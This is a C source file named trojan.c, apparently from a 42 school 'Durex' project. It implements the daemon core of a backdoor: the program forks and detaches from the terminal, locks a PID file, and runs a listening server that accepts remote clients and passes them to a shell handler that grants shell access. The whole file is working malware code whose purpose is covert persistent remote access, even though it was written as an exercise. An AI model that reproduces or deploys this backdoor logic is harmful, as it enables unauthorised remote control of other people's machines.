/* ************************************************************************** */
/*                                                                            */
/*                                                        :::      ::::::::   */
/*   trojan.c                                           :+:      :+:    :+:   */
/*                                                    +:+ +:+         +:+     */
/*   By: hivian <hivian@student.42.fr>              +#+  +:+       +#+        */
/*                                                +#+#+#+#+#+   +#+           */
/*   Created: 2017/06/01 15:20:54 by hivian            #+#    #+#             */
/*   Updated: 2017/06/09 10:08:05 by hivian           ###   ########.fr       */
/*                                                                            */
/* ************************************************************************** */

#include "durex.h"

static void		lock_file(t_env *e) {
	FILE	*lockfile = fopen(LOCK_PATH, "w+");

	if (fileno(lockfile) == -1) {
		fprintf(e->f_logs, "Could not open PID lock file %s, exiting\n", LOCK_PATH);
		fflush(e->f_logs);
        exit(EXIT_SUCCESS);
	}
	if (lockf(fileno(lockfile), F_TLOCK, 0) == -1) {
		fprintf(e->f_logs, "Could not lock PID lock file %s, exiting\n", LOCK_PATH);
		fflush(e->f_logs);
        exit(EXIT_SUCCESS);
	}
}

static int		check_nb_client(char *str, t_thread_params *params, t_env *e)
{
	if (params->total_connection < MAX_CLIENTS)
	{
		pthread_mutex_lock(&lock);
		params->total_connection++;
		pthread_mutex_unlock(&lock);
		snprintf(str, 256, "Received new connection: %s:%d", e->client_ip, e->client_port);
		print_logs(e->f_logs, str);
		return (1);
	}
	else
	{
		snprintf(str, 256, "Max number of users reached. Limit: %d", MAX_CLIENTS);
		print_logs(e->f_logs, str);
		close(e->csock);
		return (0);
	}
}
static void		loop(t_env *e)
{
	t_thread_params params;
	pthread_attr_t thread_attr = thread_init();
	char str[256];

	params.logs = e->f_logs;
	params.total_connection = 0;
	params.shell_on = false;
	params.save_out = dup(STDOUT_FILENO);
	params.save_err = dup(STDERR_FILENO);
	while (1)
	{
		pthread_t thread;

		print_logs(e->f_logs, "Waiting for a new connection.");
		if ((e->csock = accept(e->hsock, (struct sockaddr *)&e->haddr, &e->haddr_size)) == -1)
			exit(1);
		bzero(str, sizeof(str));
		get_client_ip(e);
		params.hsock = e->hsock;
		params.csock = e->csock;
		params.cli_ip = e->client_ip;
		params.cli_port = e->client_port;
		if (!check_nb_client(str, &params, e))
			continue;
		if (params.shell_on == false) {
			if (pthread_create(&thread, &thread_attr, thread_handler, &params) < 0)
	        {
				print_logs(e->f_logs, "Could not create thread");
	            continue;
	        }
		} else {
			print_logs(e->f_logs, "Shelled");
			if (pthread_create(&thread, &thread_attr, shell_handler, &params) < 0)
	        {
				print_logs(e->f_logs, "Could not create thread");
	            continue;
	        }
		}
		pthread_join( thread, NULL);
	}
}

void			trojan(t_env *e)
{
	//signal_handler();
	pid_t process_id = 0;
	pid_t sid = 0;
	process_id = fork();
	if (process_id < 0)
	{
		fprintf(stderr, "fork failed!\n");
		exit(EXIT_SUCCESS);
	}
	if (process_id > 0)
	{
		fprintf(stderr, "process_id of child process %d \n", process_id);
		exit(EXIT_SUCCESS);
	}
	umask(027);
	sid = setsid();
	if(sid < 0)
	{
		exit(1);
	}
	chdir("/");
	close(STDIN_FILENO);

	if ((e->f_logs = fopen(LOG_PATH, "w+")) == NULL)
		exit(1);
	lock_file(e);
	create_server(e);
	loop(e);
	fclose(e->f_logs);
}
